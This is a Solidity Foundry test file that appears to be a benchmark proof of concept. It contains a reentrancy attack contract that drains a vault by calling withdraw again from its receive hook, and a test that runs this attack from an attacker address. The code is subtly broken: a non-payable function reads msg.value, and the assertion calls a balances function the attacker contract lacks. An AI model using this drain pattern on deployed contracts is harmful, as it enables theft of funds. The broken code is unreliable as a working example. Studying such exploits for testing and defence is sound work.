// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/67bd2b9e-af86-44f6-b063-f96fcd2a795e_ReentrancyVault.sol";

contract ReentrancyReceiver {
    ReentrancyVault private immutable target;
    uint256 private immutable amount;

    constructor(ReentrancyVault target_) {
        target = target_;
        amount = 1 ether;
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }

    function attack() external {
        require(msg.value == amount, "incorrect seed");
        target.deposit{value: amount}();
        target.withdraw(amount);
    }
}

contract PocTest is BaseTestWithBalanceLog {
    ReentrancyVault target;
    ReentrancyReceiver receiver;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new ReentrancyVault();
        receiver = new ReentrancyReceiver(target);
        vm.deal(attacker, 10 ether);
        vm.deal(address(target), 10 ether);
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        receiver.attack{value: 1 ether}();
        assertGt(receiver.balances(address(receiver)), 1 ether);
    }
}